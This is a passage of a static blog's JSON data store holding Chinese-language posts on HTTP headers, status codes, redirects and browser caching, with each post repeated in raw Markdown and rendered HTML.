服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content-Encoding: gzip; Vary: Content-Encoding，那么Cache服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding。</li>\n</ul>\n</li>\n<li>安全响应首部<ul>\n<li>Set-Cookie：由服务器发送，它包含在响应请求的头部中。它用于在客户端创建一个Cookie。</li>\n<li>Proxy-Authenticate：代理服务器响应浏览器，要求其提供代理身份验证信息。</li>\n<li>Access-Control-Allow-Origin：origin 参数的值指定了允许访问该资源的外域 URI（Ajax 跨域资源共享）</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>实体首部<ul>\n<li>信息性首部<ul>\n<li>Allow：服务器支持哪些请求方法（如GET、POST等）。</li>\n<li>Location：表示客户应当到哪里去提取文档，用于将接收端定位到资源的位置（URL）上。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302</li>\n</ul>\n</li>\n<li>实体内容首部<ul>\n<li>Content-Encoding:告知客户端服务器对实体的主体部分选用的内容编码方式。（gzip/compress/deflate/identity)</li>\n<li>Content-Language:告知客户端，实体主体使用的自然语言。（中文或英文等语言）</li>\n<li>Content-Length：表明了实体主体部分的大小。</li>\n<li>Content-Location:给出与报文主体返回资源对应的URI。</li>\n<li>Content-MD5：是一串由MD5算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。</li>\n<li>Content-Range:针对范围请求，返回响应时使用的首部字段，能告知客户端作为相应返回的实体的哪个部分符合范围请求。</li>\n<li>Content-Type:说明了实体主体内对象的媒体类型，该字段用type/subtype形式赋值。</li>\n</ul>\n</li>\n<li>实体缓存首部<ul>\n<li>Etag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html文件，如果被修改了，其Etag也会别修改，所以，ETag的作用跟Last-Modified的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得ETag值发送给WEB服务器，然后WEB服务器会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变了。</li>\n<li>Expires：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT</li>\n<li>Last-Modified：WEB服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT</li>\n</ul>\n</li>\n<li>实体编码首部<ul>\n<li>Accept-Encoding：客户端发送给服务器，表明自己可以接受哪些编码（gzip、compress、deflate、identity）</li>\n<li>Content-Encoding: 服务器发送给客户端，告诉客户端以哪种方式解码 （gzip、compress、deflate、identity）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"4、HTTP-状态码\"><a href=\"#4、HTTP-状态码\" class=\"headerlink\" title=\"4、HTTP 状态码\"></a>4、HTTP 状态码</h3><ul>\n<li>100 Continue</li>\n<li>200 OK</li>\n<li>201 Created 请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回 (常规使用场景是作为 PUT 请求的返回值)</li>\n<li>202 Accepted 服务器已接受请求，但尚未处理</li>\n<li>204 No Content（无内容）</li>\n<li>206 Partial Content（使用断点续传）</li>\n<li>301 Moved Permanently</li>\n<li>302 Move Temporarily</li>\n<li>304 Not Modified</li>\n<li>400 Bad Request（不合规范的请求）</li>\n<li>401 Unauthorized（未授权）</li>\n<li>403 Forbidden（禁止访问）</li>\n<li>404 Not Found（文件找不到）</li>\n<li>500 Internal Server Error（内部服务器错误）</li>\n<li>503 Service Unavailable（服务不可用）</li>\n<li>504 Gateway Timeout</li>\n</ul>\n<h3 id=\"5、Get-与-Post-请求的区别\"><a href=\"#5、Get-与-Post-请求的区别\" class=\"headerlink\" title=\"5、Get 与 Post 请求的区别\"></a>5、Get 与 Post 请求的区别</h3><ul>\n<li>Get 请求能缓存，Post 不能</li>\n<li>Post 相对 Get 安全一点点，因为Get 请求都包含在 URL 里，且会被浏览器保存历史纪录，Post 不会，但是在抓包的情况下都是一样的。</li>\n<li>Post 可以通过 request body来传输比 Get 更多的数据，Get 没有这个技术</li>\n<li>URL有长度限制，会影响 Get 请求，但是这个长度限制是浏览器规定的，不是 RFC 规定的</li>\n<li>Post 支持更多的编码类型且不对数据类型限制</li>\n</ul>\n"},{"title":"HTTP 请求与重定向","date":"2021-01-14T07:42:00.000Z","_content":"\n# HTTP 请求与重定向\n\n### 幂等方法\n\n幂等：指无论调用多少次都是相同的作用（对于资源而言）\n\n*   幂等方法：`GET`、`DELETE`、`PUT`、`HEAD`\n*   非幂等方法：`POST`、`PATCH`\n\n### HTTP请求方法\n\n| 方法 | 作用 | 安全性 | 幂等性 |\n| --- | --- | --- | --- |\n| GET | 查询 | 是 | 是 |\n| POST | 新增 | 否 | 否 |\n| PUT | 更新 | 否 | 是 |\n| DELETE | 删除 | 否 | 是 |\n| PATCH | 局部更新 | 否 | 否 |\n\n在HTTP1.0中，对于301、302的 location 中包含的重定向url，如果请求method不是GET或者HEAD，那么浏览器是禁止自动重定向的，除非得到用户的确认，因为POST、PATCH等请求是非冥等的（也就是再次请求时服务器的资源可能已经发生了变化）\n\n虽然rfc明确了上述的规定，但是很多的浏览器不遵守这条规定，无论原来的请求方法是什么都会自动用GET方法重定向到location指定的url。就是说现存的很多浏览器在遇到POST请求返回301、302状态码的时候自动用GET请求location中的url，无需用户确认。\n\n为了解决这种不规范的问题，HTTP 1.1中新增了303、307状态码，用来明确服务器期待客户端进行何种反应。\n\n303状态码，指客户端可以自动用GET方法重定向请求location中的url，无需用户确认。无论之前是 GET 方式还是 POST 方式。\n\n307状态码，指客户端需要遵守原本301、302的规定，除GET、HEAD方法外，其他的请求方法必须等客户确认才能跳转。\n\n*   301：（Permanently Moved）永久重定向\n*   302：（Temporarily Moved）临时重定向。标准规定，不允许客户端在重定向时改变请求的方法，但浏览器并未遵循该标准（303/307 为 HTTP/1.1 标准，用于解决 302 的问题）\n*   303：会使用GET方式访问在Location中规定的URI，而无视原先请求的方法\n*   307：对于非GET、HEAD请求，浏览器会自动禁止重定向，除非得到用户确认\n\n> **302 网址劫持：**  指利用域 A 上的一个页引用有高质量更新内容的域 B。这样基于从域B“偷来”的更新内容，这个页面会有较好的排名。并且利用伪装方式，将用户重定向到另一个页面。（主要通过窃取的内容、PR来获取搜索引擎较好的排名）\n\n**重定向与转发**\n\n*   请求重定向：客户端行为，相当于两次请求，前一次的请求对象不保存，URL改变\n*   请求转发：服务器端行为，是一次请求，前一次的请求对象保存，URL不改变","source":"_posts/HTTP/HTTP 请求与重定向.md","raw":"---\ntitle: HTTP 请求与重定向\ncategories: HTTP\ntags: [HTTP]\ndate: 2021-01-14 15:42:00\n---\n\n# HTTP 请求与重定向\n\n### 幂等方法\n\n幂等：指无论调用多少次都是相同的作用（对于资源而言）\n\n*   幂等方法：`GET`、`DELETE`、`PUT`、`HEAD`\n*   非幂等方法：`POST`、`PATCH`\n\n### HTTP请求方法\n\n| 方法 | 作用 | 安全性 | 幂等性 |\n| --- | --- | --- | --- |\n| GET | 查询 | 是 | 是 |\n| POST | 新增 | 否 | 否 |\n| PUT | 更新 | 否 | 是 |\n| DELETE | 删除 | 否 | 是 |\n| PATCH | 局部更新 | 否 | 否 |\n\n在HTTP1.0中，对于301、302的 location 中包含的重定向url，如果请求method不是GET或者HEAD，那么浏览器是禁止自动重定向的，除非得到用户的确认，因为POST、PATCH等请求是非冥等的（也就是再次请求时服务器的资源可能已经发生了变化）\n\n虽然rfc明确了上述的规定，但是很多的浏览器不遵守这条规定，无论原来的请求方法是什么都会自动用GET方法重定向到location指定的url。就是说现存的很多浏览器在遇到POST请求返回301、302状态码的时候自动用GET请求location中的url，无需用户确认。\n\n为了解决这种不规范的问题，HTTP 1.1中新增了303、307状态码，用来明确服务器期待客户端进行何种反应。\n\n303状态码，指客户端可以自动用GET方法重定向请求location中的url，无需用户确认。无论之前是 GET 方式还是 POST 方式。\n\n307状态码，指客户端需要遵守原本301、302的规定，除GET、HEAD方法外，其他的请求方法必须等客户确认才能跳转。\n\n*   301：（Permanently Moved）永久重定向\n*   302：（Temporarily Moved）临时重定向。标准规定，不允许客户端在重定向时改变请求的方法，但浏览器并未遵循该标准（303/307 为 HTTP/1.1 标准，用于解决 302 的问题）\n*   303：会使用GET方式访问在Location中规定的URI，而无视原先请求的方法\n*   307：对于非GET、HEAD请求，浏览器会自动禁止重定向，除非得到用户确认\n\n> **302 网址劫持：**  指利用域 A 上的一个页引用有高质量更新内容的域 B。这样基于从域B“偷来”的更新内容，这个页面会有较好的排名。并且利用伪装方式，将用户重定向到另一个页面。（主要通过窃取的内容、PR来获取搜索引擎较好的排名）\n\n**重定向与转发**\n\n*   请求重定向：客户端行为，相当于两次请求，前一次的请求对象不保存，URL改变\n*   请求转发：服务器端行为，是一次请求，前一次的请求对象保存，URL不改变","slug":"HTTP/HTTP 请求与重定向","published":1,"updated":"2021-04-30T07:19:35.360Z","_id":"cko3zg3iw000nmi6r3tac9o2d","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"HTTP-请求与重定向\"><a href=\"#HTTP-请求与重定向\" class=\"headerlink\" title=\"HTTP 请求与重定向\"></a>HTTP 请求与重定向</h1><h3 id=\"幂等方法\"><a href=\"#幂等方法\" class=\"headerlink\" title=\"幂等方法\"></a>幂等方法</h3><p>幂等：指无论调用多少次都是相同的作用（对于资源而言）</p>\n<ul>\n<li>  幂等方法：<code>GET</code>、<code>DELETE</code>、<code>PUT</code>、<code>HEAD</code></li>\n<li>  非幂等方法：<code>POST</code>、<code>PATCH</code></li>\n</ul>\n<h3 id=\"HTTP请求方法\"><a href=\"#HTTP请求方法\" class=\"headerlink\" title=\"HTTP请求方法\"></a>HTTP请求方法</h3><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>作用</th>\n<th>安全性</th>\n<th>幂等性</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>GET</td>\n<td>查询</td>\n<td>是</td>\n<td>是</td>\n</tr>\n<tr>\n<td>POST</td>\n<td>新增</td>\n<td>否</td>\n<td>否</td>\n</tr>\n<tr>\n<td>PUT</td>\n<td>更新</td>\n<td>否</td>\n<td>是</td>\n</tr>\n<tr>\n<td>DELETE</td>\n<td>删除</td>\n<td>否</td>\n<td>是</td>\n</tr>\n<tr>\n<td>PATCH</td>\n<td>局部更新</td>\n<td>否</td>\n<td>否</td>\n</tr>\n</tbody></table>\n<p>在HTTP1.0中，对于301、302的 location 中包含的重定向url，如果请求method不是GET或者HEAD，那么浏览器是禁止自动重定向的，除非得到用户的确认，因为POST、PATCH等请求是非冥等的（也就是再次请求时服务器的资源可能已经发生了变化）</p>\n<p>虽然rfc明确了上述的规定，但是很多的浏览器不遵守这条规定，无论原来的请求方法是什么都会自动用GET方法重定向到location指定的url。就是说现存的很多浏览器在遇到POST请求返回301、302状态码的时候自动用GET请求location中的url，无需用户确认。</p>\n<p>为了解决这种不规范的问题，HTTP 1.1中新增了303、307状态码，用来明确服务器期待客户端进行何种反应。</p>\n<p>303状态码，指客户端可以自动用GET方法重定向请求location中的url，无需用户确认。无论之前是 GET 方式还是 POST 方式。</p>\n<p>307状态码，指客户端需要遵守原本301、302的规定，除GET、HEAD方法外，其他的请求方法必须等客户确认才能跳转。</p>\n<ul>\n<li>  301：（Permanently Moved）永久重定向</li>\n<li>  302：（Temporarily Moved）临时重定向。标准规定，不允许客户端在重定向时改变请求的方法，但浏览器并未遵循该标准（303/307 为 HTTP/1.1 标准，用于解决 302 的问题）</li>\n<li>  303：会使用GET方式访问在Location中规定的URI，而无视原先请求的方法</li>\n<li>  307：对于非GET、HEAD请求，浏览器会自动禁止重定向，除非得到用户确认</li>\n</ul>\n<blockquote>\n<p><strong>302 网址劫持：</strong>  指利用域 A 上的一个页引用有高质量更新内容的域 B。这样基于从域B“偷来”的更新内容，这个页面会有较好的排名。并且利用伪装方式，将用户重定向到另一个页面。（主要通过窃取的内容、PR来获取搜索引擎较好的排名）</p>\n</blockquote>\n<p><strong>重定向与转发</strong></p>\n<ul>\n<li>  请求重定向：客户端行为，相当于两次请求，前一次的请求对象不保存，URL改变</li>\n<li>  请求转发：服务器端行为，是一次请求，前一次的请求对象保存，URL不改变</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"HTTP-请求与重定向\"><a href=\"#HTTP-请求与重定向\" class=\"headerlink\" title=\"HTTP 请求与重定向\"></a>HTTP 请求与重定向</h1><h3 id=\"幂等方法\"><a href=\"#幂等方法\" class=\"headerlink\" title=\"幂等方法\"></a>幂等方法</h3><p>幂等：指无论调用多少次都是相同的作用（对于资源而言）</p>\n<ul>\n<li>  幂等方法：<code>GET</code>、<code>DELETE</code>、<code>PUT</code>、<code>HEAD</code></li>\n<li>  非幂等方法：<code>POST</code>、<code>PATCH</code></li>\n</ul>\n<h3 id=\"HTTP请求方法\"><a href=\"#HTTP请求方法\" class=\"headerlink\" title=\"HTTP请求方法\"></a>HTTP请求方法</h3><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>作用</th>\n<th>安全性</th>\n<th>幂等性</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>GET</td>\n<td>查询</td>\n<td>是</td>\n<td>是</td>\n</tr>\n<tr>\n<td>POST</td>\n<td>新增</td>\n<td>否</td>\n<td>否</td>\n</tr>\n<tr>\n<td>PUT</td>\n<td>更新</td>\n<td>否</td>\n<td>是</td>\n</tr>\n<tr>\n<td>DELETE</td>\n<td>删除</td>\n<td>否</td>\n<td>是</td>\n</tr>\n<tr>\n<td>PATCH</td>\n<td>局部更新</td>\n<td>否</td>\n<td>否</td>\n</tr>\n</tbody></table>\n<p>在HTTP1.0中，对于301、302的 location 中包含的重定向url，如果请求method不是GET或者HEAD，那么浏览器是禁止自动重定向的，除非得到用户的确认，因为POST、PATCH等请求是非冥等的（也就是再次请求时服务器的资源可能已经发生了变化）</p>\n<p>虽然rfc明确了上述的规定，但是很多的浏览器不遵守这条规定，无论原来的请求方法是什么都会自动用GET方法重定向到location指定的url。就是说现存的很多浏览器在遇到POST请求返回301、302状态码的时候自动用GET请求location中的url，无需用户确认。</p>\n<p>为了解决这种不规范的问题，HTTP 1.1中新增了303、307状态码，用来明确服务器期待客户端进行何种反应。</p>\n<p>303状态码，指客户端可以自动用GET方法重定向请求location中的url，无需用户确认。无论之前是 GET 方式还是 POST 方式。</p>\n<p>307状态码，指客户端需要遵守原本301、302的规定，除GET、HEAD方法外，其他的请求方法必须等客户确认才能跳转。</p>\n<ul>\n<li>  301：（Permanently Moved）永久重定向</li>\n<li>  302：（Temporarily Moved）临时重定向。标准规定，不允许客户端在重定向时改变请求的方法，但浏览器并未遵循该标准（303/307 为 HTTP/1.1 标准，用于解决 302 的问题）</li>\n<li>  303：会使用GET方式访问在Location中规定的URI，而无视原先请求的方法</li>\n<li>  307：对于非GET、HEAD请求，浏览器会自动禁止重定向，除非得到用户确认</li>\n</ul>\n<blockquote>\n<p><strong>302 网址劫持：</strong>  指利用域 A 上的一个页引用有高质量更新内容的域 B。这样基于从域B“偷来”的更新内容，这个页面会有较好的排名。并且利用伪装方式，将用户重定向到另一个页面。（主要通过窃取的内容、PR来获取搜索引擎较好的排名）</p>\n</blockquote>\n<p><strong>重定向与转发</strong></p>\n<ul>\n<li>  请求重定向：客户端行为，相当于两次请求，前一次的请求对象不保存，URL改变</li>\n<li>  请求转发：服务器端行为，是一次请求，前一次的请求对象保存，URL不改变</li>\n</ul>\n"},{"title":"HTTP 缓存","date":"2021-01-14T07:45:00.000Z","_content":"\n# HTTP 缓存\n\n## 1、强缓存\n\n说明：强缓存直接从浏览器缓存中获取，不发送请求到服务器 \n使用：用`Cache-Control`、 `Expires` 头信息\n\n### 1.1 强缓存相关头信息\n\n* `Cache-Control`: HTTP/1.1 标准， 使用相对时间（从生成文档开始计时，**推荐使用**，优先级高于 `Expires`）\n* `Expires`：HTTP/1.0 标准，使用绝对时间（依赖计算器本地时间，可能不准确）\n\n```\n// Request Header \nIf-None-Match: \"2a043f-6741-5456e5e0050c3\" \nIf-Modified-Since: Fri, 06 Jan 2017 15:06:49 GMT\n\n// Response Header \nCache-Control: max-age=2592000 \nExpires: Sat, 18 Feb 2017 08:31:00 GMT \nETag: \"2a043f-6741-5456e5e0050c3\"\nLast-Modified: Fri, 06 Jan 2017 15:06:49 GMT\n```\n\n### 1.2 Cache-Control 头信息字段\n\n| Cache-directive |\t说明 |\n| :-: | :-: | \n| private |  **私有缓存**，即内容只缓存到私有缓存中(仅客户端可以缓存，代理服务器不可缓存)，默认为 private |\n| public |  **公有缓存**，即所有内容都将被缓存(客户端和代理服务器都可缓存) |\n| no-store |  **禁止进行缓存**，即所有内容都不会被缓存到缓存或 Internet 临时文件中 |\n| no-cache |  **强制确认缓存**，即必须先与服务器确认返回的响应是否被更改（该请求应该会带有与本地缓存相关的验证字段），然后才能使用该响应来满足后续对同一个网址的请求。因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，如果资源未被更改，可以避免下载。 |\n| must-revalidation/proxy-revalidation |  **过期校验缓存**，即超过设定的过期时间后会重新检验新鲜度，通常与 *max-age* 配合使用，如果缓存的内容失效，请求必须发送到服务器/代理以进行重新验证 |\n| immutable |  **不可变的缓存**，即表示该资源是不可变的（如资源名称加了指纹信息，md5 戳等），不用重新验证新鲜度，所以不必向服务器发送请求，直接从缓存中获取，也可设置 max-age 为过期时间 |\n| max-age=xxx |  缓存的内容将在 xxx 秒后失效, 这个选项只在 HTTP 1.1可用, 并如果和 Last-Modified 一起使用时, 优先级较高 |\n| stale-while-revalidate | 提供的是一个宽限期（由 max-age=xxx ），当检查新版本时，允许浏览器在这段宽限期期间使用过期的（旧的）资源 |\n| stale-if-error | 如果重新验证资源时返回了 5xx 之类的错误，stale-if-error 会给浏览器一个使用旧的响应的宽限期 |\n\n\n> **Clear-Site-Data**：实验性质的响应头，表示清除当前请求网站有关的浏览器数据（cookie，存储，缓存），可选值为 `cache`、`cookies`、`storage` 或 `*`，如登出时可设置响应头为 `Clear-Site-Data: \"cache\", \"cookies\", \"storage\"`\n\n> 通常情况下，因为访问页面的 url 不能改变，所以不对 html 文件作缓存处理，可设置 `Cache-Control: max-age=0`，对于 js、css 等经常改变且含指纹信息的资源，可设置 `Cache-Control: public, max-age=31536000000`\n\n\n### 1.3 缓存校验\n> 用户点击刷新按钮时会开始缓存验证。如果缓存的响应头信息里含有 \"Cache-control: must-revalidate\" 的定义，在浏览的过程中也会触发缓存验证。另外，在浏览器偏好设置里设置Advanced->Cache为强制验证缓存也能达到相同的效果。当缓存的文档过期后，需要进行缓存验证或者重新获取资源。只有在服务器返回强校验器或者弱校验器时才会进行验证。\n\n> 作为缓存的一种强校验器，ETag 响应头是一个对用户代理(User Agent, 下面简称UA)不透明（译者注：UA 无需理解，只需要按规定使用即可）的值。对于像浏览器这样的HTTP UA，不知道ETag代表什么，不能预测它的值是多少。如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 If-None-Match 头来验证缓存。<br/>\n> Last-Modified 响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。如果响应头里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。\n\n\n## 2、协商缓存\n\n说明：先发送请求给服务器，如果命中缓存，则从浏览器缓存中获取 \n使用：用 `Last-Modificd` 和 `If-Modificd-Since`、`Etag` 和 `If-None-Match` 头信息\n\n* 分布式系统里多台机器间文件的 last-modified 必须保持一致，以免负载均衡到不同机器导致比对失败\n* 分布式系统尽量关闭掉 Etag (每台机器生成的 `Etag` 都会不一样)\n\nEtag: 实体标签（版本标识符），用于表示文档的版本号、序列号、内容校验或指纹信息，表明文档是否被修改\n\nLast-Modified 标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间，如果某些文件会被定期生成，当有时内容并没有任何变化，但 Last-Modified 却改变了，导致文件没法使用缓存，有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。\n\n\n### `Etag`、`If-None-Match`\n\n*   Etag：web 服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器觉得）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。\n*   If-None-Match：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。\n\n### `Last-Modified`、`If-Modified-Since`\n\n*   Last-Modified：标示这个响应资源的最后修改时间。web服务器在响应请求时，告诉客户端资源的最后修改时间。\n*   If-Modified-Since：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Last-Modified声明，则再次向web服务器请求时带上头 If-Modified-Since，表示请求时间。web服务器收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对。若最后修改时间较新，说明资源被改动过，则响应整片资源内容（写在响应消息包体内），则响应HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省流量)，告知浏览器继续使用所保存的cache。\n\n\n## 3、其他\n\n![HTTP 缓存示意图](http://owl6flhin.bkt.clouddn.com/555379-20160404211645125-1662003962.png)\n\n### 新鲜度\n\n> 理论上来讲，当一个资源被缓存存储后，该资源应该可以被永久存储在缓存中。由于缓存只有有限的空间用于存储资源副本，所以缓存会定期地将一些副本删除，这个过程叫做缓存驱逐。另一方面，当服务器上面的资源进行了更新，那么缓存中的对应资源也应该被更新，由于HTTP是C/S模式的协议，服务器更新一个资源时，不可能直接通知客户端及其缓存，所以双方必须为该资源约定一个过期时间，在该过期时间之前，该资源（缓存副本）就是新鲜的，当过了过期时间后，该资源（缓存副本）则变为陈旧的。驱逐算法用于将陈旧的资源（缓存副本）替换为新鲜的，注意，一个陈旧的资源（缓存副本）是不会直接被清除或忽略的，当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个If-None-Match头，然后发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 304 (Not Modified)（该响应不会有带有实体信息），则表示此资源副本是新鲜的，这样一来，可以节省一些带宽。若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。\n\n![HTTP 新鲜度示意图](https://mdn.mozillademos.org/files/13771/HTTPStaleness.png)\n\n> 对于含有特定头信息的请求，会去计算缓存寿命。比如Cache-control: max-age=N的请求头，相应的缓存的寿命就是N。通常情况下，对于不含这个属性的请求则会去查看是否包含Expires属性，通过比较Expires的值和头里面Date属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的Last-Modified信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）\n\n### 资源加速\n> 不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。\n\n> 这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的css和js文件，避免这种不一致性是非常重要的。\n\n### 浏览器缓存\n\n* `200 ok ` : 从原始服务器请求成功\n* `200 ok from cache` : 从缓存中获取，未向服务器验证新鲜度\n    * `200 ok from disk cache` : 从磁盘中获取（已缓存到磁盘中，如CSS样式等）\n    * `200 ok from memory cache` : 从内存中获取（已缓存到磁盘并存在内存中，如脚本、字体、图片等）\n* `304 not modified` ：向服务器发送请求，验证新鲜度，足够新鲜，服务器会返回 304状态\n\n### 页面刷新\n*   当 F5 刷新页面时，跳过强缓存功能，检查协商缓存（与在地址栏中输入url的作用一样）\n*   当 Ctrl + F5 刷新页面时，跳过强缓存和协商缓存 （直接从服务器中加载）","source":"_posts/HTTP/HTTP 缓存.md","raw":"---\ntitle: HTTP 缓存\ncategories: HTTP\ntags: [HTTP]\ndate: 2021-01-14 15:45:00\n---\n\n# HTTP 缓存\n\n## 1、强缓存\n\n说明：强缓存直接从浏览器缓存中获取，不发送请求到服务器 \n使用：用`Cache-Control`、 `Expires` 头信息\n\n### 1.1 强缓存相关头信息\n\n* `Cache-Control`: HTTP/1.1 标准， 使用相对时间（从生成文档开始计时，**推荐使用**，优先级高于 `Expires`）\n* `Expires`：HTTP/1.0 标准，使用绝对时间（依赖计算器本地时间，可能不准确）\n\n```\n// Request Header \nIf-None-Match: \"2a043f-6741-5456e5e0050c3\" \nIf-Modified-Since: Fri, 06 Jan 2017 15:06:49 GMT\n\n// Response Header \nCache-Control: max-age=2592000 \nExpires: Sat, 18 Feb 2017 08:31:00 GMT \nETag: \"2a043f-6741-5456e5e0050c3\"\nLast-Modified: Fri, 06 Jan 2017 15:06:49 GMT\n```\n\n### 1.2 Cache-Control 头信息字段\n\n| Cache-directive |\t说明 |\n| :-: | :-: | \n| private |  **私有缓存**，即内容只缓存到私有缓存中(仅客户端可以缓存，代理服务器不可缓存)，默认为 private |\n| public |  **公有缓存**，即所有内容都将被缓存(客户端和代理服务器都可缓存) |\n| no-store |  **禁止进行缓存**，即所有内容都不会被缓存到缓存或 Internet 临时文件中 |\n| no-cache |  **强制确认缓存**，即必须先与服务器确认返回的响应是否被更改（该请求应该会带有与本地缓存相关的验证字段），然后才能使用该响应来满足后续对同一个网址的请求。因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，如果资源未被更改，可以避免下载。 |\n| must-revalidation/proxy-revalidation |  **过期校验缓存**，即超过设定的过期时间后会重新检验新鲜度，通常与 *max-age* 配合使用，如果缓存的内容失效，请求必须发送到服务器/代理以进行重新验证 |\n| immutable |  **不可变的缓存**，即表示该资源是不可变的（如资源名称加了指纹信息，md5 戳等），不用重新验证新鲜度，所以不必向服务器发送请求，直接从缓存中获取，也可设置 max-age 为过期时间 |\n| max-age=xxx |  缓存的内容将在 xxx 秒后失效, 这个选项只在 HTTP 1.1可用, 并如果和 Last-Modified 一起使用时, 优先级较高 |\n| stale-while-revalidate | 提供的是一个宽限期（由 max-age=xxx ），当检查新版本时，允许浏览器在这段宽限期期间使用过期的（旧的）资源 |\n| stale-if-error | 如果重新验证资源时返回了 5xx 之类的错误，stale-if-error 会给浏览器一个使用旧的响应的宽限期 |\n\n\n> **Clear-Site-Data**：实验性质的响应头，表示清除当前请求网站有关的浏览器数据（cookie，存储，缓存），可选值为 `cache`、`cookies`、`storage` 或 `*`，如登出时可设置响应头为 `Clear-Site-Data: \"cache\", \"cookies\", \"storage\"`\n\n> 通常情况下，因为访问页面的 url 不能改变，所以不对 html 文件作缓存处理，可设置 `Cache-Control: max-age=0`，对于 js、css 等经常改变且含指纹信息的资源，可设置 `Cache-Control: public, max-age=31536000000`\n\n\n### 1.3 缓存校验\n> 用户点击刷新按钮时会开始缓存验证。如果缓存的响应头信息里含有 \"Cache-control: must-revalidate\" 的定义，在浏览的过程中也会触发缓存验证。另外，在浏览器偏好设置里设置Advanced->Cache为强制验证缓存也能达到相同的效果。当缓存的文档过期后，需要进行缓存验证或者重新获取资源。只有在服务器返回强校验器或者弱校验器时才会进行验证。\n\n> 作为缓存的一种强校验器，ETag 响应头是一个对用户代理(User Agent, 下面简称UA)不透明（译者注：UA 无需理解，只需要按规定使用即可）的值。对于像浏览器这样的HTTP UA，不知道ETag代表什么，不能预测它的值是多少。如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 If-None-Match 头来验证缓存。<br/>\n> Last-Modified 响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。如果响应头里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。\n\n\n## 2、协商缓存\n\n说明：先发送请求给服务器，如果命中缓存，则从浏览器缓存中获取 \n使用：用 `Last-Modificd` 和 `If-Modificd-Since`、`Etag` 和 `If-None-Match` 头信息\n\n* 分布式系统里多台机器间文件的 last-modified 必须保持一致，以免负载均衡到不同机器导致比对失败\n* 分布式系统尽量关闭掉 Etag (每台机器生成的 `Etag` 都会不一样)\n\nEtag: 实体标签（版本标识符），用于表示文档的版本号、序列号、内容校验或指纹信息，表明文档是否被修改\n\nLast-Modified 标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间，如果某些文件会被定期生成，当有时内容并没有任何变化，但 Last-Modified 却改变了，导致文件没法使用缓存，有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。\n\n\n### `Etag`、`If-None-Match`\n\n*   Etag：web 服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器觉得）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。\n*   If-None-Match：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。\n\n### `Last-Modified`、`If-Modified-Since`\n\n*   